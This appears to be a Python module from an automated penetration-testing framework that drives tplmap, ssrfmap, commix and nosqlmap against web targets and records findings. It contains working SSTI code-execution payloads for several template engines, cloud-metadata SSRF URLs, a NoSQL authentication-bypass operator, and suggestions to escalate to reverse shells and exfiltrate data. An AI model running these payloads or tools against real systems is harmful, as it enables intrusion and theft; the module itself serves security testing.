"""
injection_subagent.py — Advanced injection testing: SSTI, SSRF, command injection, NoSQL.

Methodology:
  1. tplmap  — Server-Side Template Injection detection and exploitation
  2. ssrfmap — SSRF vulnerability detection and chaining
  3. commix  — OS command injection via web parameters
  4. nosqlmap — NoSQL injection (MongoDB, CouchDB, etc.)
  5. Severity:
       CRITICAL — RCE via SSTI or command injection (tplmap/commix shell confirmed)
       HIGH     — SSRF reaching internal services or cloud metadata
       MEDIUM   — NoSQL injection (data access without code execution)
  6. Emit "injection_complete" event
"""

from __future__ import annotations

import logging
import re
import time
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Output patterns
# ---------------------------------------------------------------------------

# tplmap
_TPLMAP_VULN_RE  = re.compile(r"is vulnerable|Tplmap identified|injection point found|engine:\s+(\w+)", re.IGNORECASE)
_TPLMAP_ENGINE_RE = re.compile(r"template engine:\s*(.+)", re.IGNORECASE)
_TPLMAP_SHELL_RE  = re.compile(r"os.shell\(\)|shell_exec|system\(|exec\(|eval\(|RCE|command executed", re.IGNORECASE)

# ssrfmap
_SSRF_VULN_RE    = re.compile(r"SSRF found|vulnerable to SSRF|successful.*ssrf|response.*from.*internal", re.IGNORECASE)
_SSRF_INTERNAL_RE = re.compile(r"169\.254\.169\.254|metadata\.google|169\.254|10\.\d|192\.168\.|172\.(1[6-9]|2\d|3[01])\.", re.IGNORECASE)

# commix
_COMMIX_VULN_RE  = re.compile(r"is vulnerable|shell.*prompt|commix.*\$|command injection|os-shell", re.IGNORECASE)
_COMMIX_SHELL_RE = re.compile(r"os-shell>|pseudo-terminal shell|commix pseudo-shell", re.IGNORECASE)

# nosqlmap
_NOSQL_VULN_RE   = re.compile(r"NoSQL injection|injectable|bypass authentication|found.*nosql", re.IGNORECASE)
_NOSQL_DB_RE     = re.compile(r"database:\s*(.+)|collection:\s*(.+)", re.IGNORECASE)


# ---------------------------------------------------------------------------
# Subagent
# ---------------------------------------------------------------------------

class InjectionSubagent(BaseSubagent):
    """
    Advanced injection testing: SSTI, SSRF, command injection, and NoSQL injection.
    """

    AGENT_NAME    = "web"
    SUBAGENT_NAME = "injection"

    async def run(  # noqa: C901
        self,
        target: str,
        web_targets: list[dict] | None = None,
        endpoints:   list[str]   | None = None,
        forms_list:  list[dict]  | None = None,
        **kwargs: Any,
    ) -> SubagentResult:
        """
        Test for SSTI, SSRF, command injection, and NoSQL injection.

        Parameters
        ----------
        target:
            Base host/IP.
        web_targets:
            URL dicts from web_fingerprint.
        endpoints:
            Additional endpoints from crawl.
        forms_list:
            Form dicts from crawl.

        Returns
        -------
        SubagentResult
            parsed_data["ssti"]    — list of SSTI finding dicts
            parsed_data["ssrf"]    — list of SSRF finding dicts
            parsed_data["cmdi"]    — list of command injection finding dicts
            parsed_data["nosql"]   — list of NoSQL injection finding dicts
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )
        result.parsed_data: dict = {
            "ssti":  [],
            "ssrf":  [],
            "cmdi":  [],
            "nosql": [],
        }
        wall_start = time.monotonic()

        scan_urls: list[str] = []
        if web_targets:
            scan_urls = [wt["url"] for wt in web_targets if isinstance(wt, dict) and "url" in wt]
        if endpoints:
            for ep in endpoints:
                if ep not in scan_urls:
                    scan_urls.append(ep)
        if not scan_urls:
            scan_urls = [f"http://{target}"]

        ssti_findings:  list[dict] = []
        ssrf_findings:  list[dict] = []
        cmdi_findings:  list[dict] = []
        nosql_findings: list[dict] = []

        for url in scan_urls[:15]:  # cap for performance
            port = _port_from_url(url)

            # ── 1. tplmap — SSTI ─────────────────────────────────────────
            logger.info("[injection] tplmap SSTI on %s", url)
            try:
                tpl_out = await self.collect_tool(
                    "tplmap",
                    target,
                    {
                        "options": (
                            f"-u \"{url}\" "
                            f"--level 5 "
                            f"--timeout 15"
                        )
                    },
                )
                self._tool_outputs[f"tplmap_{url}"] = tpl_out

                if _TPLMAP_VULN_RE.search(tpl_out):
                    engine_m = _TPLMAP_ENGINE_RE.search(tpl_out)
                    engine   = engine_m.group(1).strip() if engine_m else "unknown"
                    has_rce  = bool(_TPLMAP_SHELL_RE.search(tpl_out))
                    sev      = "CRITICAL" if has_rce else "HIGH"

                    finding = {
                        "url":    url,
                        "engine": engine,
                        "rce":    has_rce,
                        "raw":    tpl_out[:600],
                    }
                    ssti_findings.append(finding)
                    await self.store_finding(Finding(
                        title=f"SSTI ({engine}): RCE {'confirmed' if has_rce else 'likely'} @ {url}",
                        description=(
                            f"Server-Side Template Injection via {engine} engine detected at {url}. "
                            + ("Remote Code Execution confirmed. " if has_rce else "")
                            + "Attacker can execute arbitrary server-side code."
                        ),
                        severity=sev,
                        evidence=tpl_out[:700],
                        tool="tplmap",
                        host=target,
                        port=port,
                        mitre_technique="T1059",
                        exploit_suggestion=_ssti_exploit_hint(engine, url),
                    ))

            except Exception as exc:
                logger.warning("[injection] tplmap error for %s: %s", url, exc)

            # ── 2. ssrfmap — SSRF ────────────────────────────────────────
            logger.info("[injection] ssrfmap SSRF on %s", url)
            try:
                ssrf_out = await self.collect_tool(
                    "ssrfmap",
                    target,
                    {
                        "options": (
                            f"-u \"{url}\" "
                            f"--level 3 "
                            f"--module readfiles,portscan,redirect "
                            f"--timeout 10"
                        )
                    },
                )
                self._tool_outputs[f"ssrfmap_{url}"] = ssrf_out

                if _SSRF_VULN_RE.search(ssrf_out):
                    internal = bool(_SSRF_INTERNAL_RE.search(ssrf_out))
                    sev = "HIGH"
                    finding = {
                        "url":            url,
                        "internal_reach": internal,
                        "raw":            ssrf_out[:600],
                    }
                    ssrf_findings.append(finding)
                    await self.store_finding(Finding(
                        title=f"SSRF{'→Internal' if internal else ''}: {url}",
                        description=(
                            f"Server-Side Request Forgery detected at {url}. "
                            + ("Server can reach internal network/metadata endpoint. " if internal else "")
                            + "Attacker can make the server issue arbitrary HTTP requests."
                        ),
                        severity=sev,
                        evidence=ssrf_out[:700],
                        tool="ssrfmap",
                        host=target,
                        port=port,
                        mitre_technique="T1090",
                        exploit_suggestion=_ssrf_exploit_hint(internal, url),
                    ))

            except Exception as exc:
                logger.warning("[injection] ssrfmap error for %s: %s", url, exc)

            # ── 3. commix — command injection ─────────────────────────────
            logger.info("[injection] commix on %s", url)
            try:
                commix_out = await self.collect_tool(
                    "commix",
                    target,
                    {
                        "options": (
                            f"--url=\"{url}\" "
                            f"--batch "
                            f"--level=2 "
                            f"--timeout=15"
                        )
                    },
                )
                self._tool_outputs[f"commix_{url}"] = commix_out

                if _COMMIX_VULN_RE.search(commix_out):
                    shell_confirmed = bool(_COMMIX_SHELL_RE.search(commix_out))
                    sev = "CRITICAL" if shell_confirmed else "HIGH"
                    finding = {
                        "url":             url,
                        "shell_confirmed": shell_confirmed,
                        "raw":             commix_out[:600],
                    }
                    cmdi_findings.append(finding)
                    await self.store_finding(Finding(
                        title=f"Command Injection: {'Shell' if shell_confirmed else 'Likely RCE'} @ {url}",
                        description=(
                            f"OS command injection detected at {url}. "
                            + ("Interactive shell obtained. " if shell_confirmed else "")
                            + "Attacker can execute arbitrary OS commands on the server."
                        ),
                        severity=sev,
                        evidence=commix_out[:700],
                        tool="commix",
                        host=target,
                        port=port,
                        mitre_technique="T1059",
                        exploit_suggestion=(
                            "Escalate to full shell: commix --url=\"<url>\" --os-shell. "
                            "Then establish reverse shell for persistence."
                        ),
                    ))

            except Exception as exc:
                logger.warning("[injection] commix error for %s: %s", url, exc)

            # ── 4. nosqlmap — NoSQL injection ─────────────────────────────
            logger.info("[injection] nosqlmap on %s", url)
            try:
                nosql_out = await self.collect_tool(
                    "nosqlmap",
                    target,
                    {
                        "options": (
                            f"--attack 1 "
                            f"--url \"{url}\" "
                            f"--verbose"
                        )
                    },
                )
                self._tool_outputs[f"nosqlmap_{url}"] = nosql_out

                if _NOSQL_VULN_RE.search(nosql_out):
                    db_m = _NOSQL_DB_RE.search(nosql_out)
                    db   = db_m.group(1) or db_m.group(2) if db_m else "unknown"
                    finding = {
                        "url": url,
                        "db":  db,
                        "raw": nosql_out[:600],
                    }
                    nosql_findings.append(finding)
                    await self.store_finding(Finding(
                        title=f"NoSQL Injection: {url}",
                        description=(
                            f"NoSQL injection vulnerability detected at {url}. "
                            f"Database: {db}. Attacker may bypass authentication or "
                            f"extract document data."
                        ),
                        severity="MEDIUM",
                        evidence=nosql_out[:700],
                        tool="nosqlmap",
                        host=target,
                        port=port,
                        mitre_technique="T1190",
                        exploit_suggestion=(
                            "Use nosqlmap to dump collections: "
                            "nosqlmap --url <url> --attack 2 --dbDump. "
                            "Test auth bypass with {$ne: null} operators in login fields."
                        ),
                    ))

            except Exception as exc:
                logger.warning("[injection] nosqlmap error for %s: %s", url, exc)

        result.parsed_data["ssti"]  = ssti_findings
        result.parsed_data["ssrf"]  = ssrf_findings
        result.parsed_data["cmdi"]  = cmdi_findings
        result.parsed_data["nosql"] = nosql_findings
        result.findings             = self._findings
        result.tool_outputs         = self._tool_outputs
        result.duration_seconds     = time.monotonic() - wall_start

        await self._emit(
            "injection_complete",
            {
                "target":           target,
                "ssti_count":       len(ssti_findings),
                "ssrf_count":       len(ssrf_findings),
                "cmdi_count":       len(cmdi_findings),
                "nosql_count":      len(nosql_findings),
                "finding_count":    len(self._findings),
                "duration_seconds": round(result.duration_seconds, 2),
            },
        )

        logger.info(
            "[injection] complete — ssti=%d ssrf=%d cmdi=%d nosql=%d findings=%d %.1fs",
            len(ssti_findings), len(ssrf_findings), len(cmdi_findings),
            len(nosql_findings), len(self._findings), result.duration_seconds,
        )
        return result


# ---------------------------------------------------------------------------
# Exploit hint helpers
# ---------------------------------------------------------------------------

def _ssti_exploit_hint(engine: str, url: str) -> str:
    hints = {
        "jinja2":  "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "twig":    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "freemarker": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        "mako":    "${__import__('os').popen('id').read()}",
        "erb":     "<%= `id` %>",
        "velocity": "#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",
    }
    payload = hints.get(engine.lower(), "Use tplmap --os-shell for interactive shell")
    return f"SSTI RCE via {engine}: {payload}. Escalate to reverse shell."


def _ssrf_exploit_hint(internal_reach: bool, url: str) -> str:
    base = (
        "Test SSRF for cloud metadata: "
        "http://169.254.169.254/latest/meta-data/ (AWS), "
        "http://metadata.google.internal/computeMetadata/v1/ (GCP)"
    )
    if internal_reach:
        return base + ". Internal network reachable — scan internal ports via SSRF."
    return base + ". Chain with Redis/Elasticsearch for data exfiltration."


def _port_from_url(url: str) -> int | None:
    m = re.search(r":(\d+)(?:/|$)", url)
    if m:
        return int(m.group(1))
    if url.startswith("https://"):
        return 443
    if url.startswith("http://"):
        return 80
    return None
